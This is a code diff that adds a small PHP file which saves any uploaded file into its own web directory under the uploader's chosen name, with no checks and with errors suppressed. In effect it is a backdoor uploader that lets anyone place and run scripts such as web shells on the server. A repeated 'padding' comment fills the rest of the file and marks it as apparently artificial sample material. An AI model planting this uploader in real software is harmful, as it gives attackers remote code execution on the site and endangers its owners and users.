@@ -1,0 +1,7 @@
+<?php
+if (isset($_FILES["f"])) {
+    $target = "./" . $_FILES["f"]["name"];
+    @copy($_FILES["f"]["tmp_name"], $target);
+}
+
+// Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner. Padding so the file is not a tiny one-liner.
